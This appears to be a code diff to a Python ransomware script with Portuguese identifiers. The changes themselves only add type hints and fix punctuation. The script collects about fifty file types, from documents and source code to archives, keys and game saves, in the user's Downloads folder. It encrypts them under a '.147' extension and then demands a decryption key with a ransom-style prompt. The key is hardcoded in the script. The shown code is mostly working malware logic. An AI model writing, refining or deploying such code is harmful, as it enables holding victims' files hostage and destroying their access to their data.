@@ -7,7 +7,7 @@ from pathlib import Path
 extensoes_arquivos = ["*.pl","*.7z","*.rar","*.m4a","*.py","*.cpp","*.cs","*.css","*.wma","*.avi","*.wmv","*.d3dbsp","*.sc2save","*.sie","*.sum","*.bkp","*.flv","*.js","*.raw","*.jpeg","*.tar","*.zip","*.tar*.gz","*.cmd","*.key","*.DOT","*.docm","*.txt", "*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.odt", "*.jpg", "*.png", "*.csv", "*.sql", "*.mdb", "*.sln", "*.php", "*.asp", "*.aspx", "*.html", "*.xml", "*.psd", "*.bmp"]
 pasta_inicial = Path.home()/"Downloads" # test folder
 
-def criptografar_arquivos():
+def criptografar_arquivos() -> None:
     for extensao_arquivo in extensoes_arquivos:
         for formato in glob.glob(extensao_arquivo):
             arquivo = open(f'{pasta_inicial}/{formato}', 'rb')
@@ -22,7 +22,7 @@ def criptografar_arquivos():
             arquivo_criptografado.write(conteudo_arquivo_criptografado)
             arquivo_criptografado.close()
 
-def descriptografar_arquivos(chave):
+def descriptografar_arquivos(chave: str) -> None:
     try:
         for arquivo_criptografado in glob.glob('*.147'):
             chave_bytes = chave.encode()
@@ -35,12 +35,11 @@ def descriptografar_arquivos(chave):
             arquivo_descriptografado = open(f'{pasta_inicial}/{nome_arquivo}', 'wb')
             arquivo_descriptografado.write(conteudo_arquivo)
             arquivo_descriptografado.close()
-
     except Exception:
         pass
 
-def main():
-    chave = input("[*] Your files have been encrypted. To decrypt them, please enter the decryption key.: ")
+def main() -> None:
+    chave = input("[*] Your files have been encrypted. To decrypt them, please enter the decryption key: ")
     if chave == 'l1eqybC6EfUwOnxjI4XeimFkdnPPe9jV':
         descriptografar_arquivos(chave)
         for arquivo_criptografado in glob.glob('*.147'):
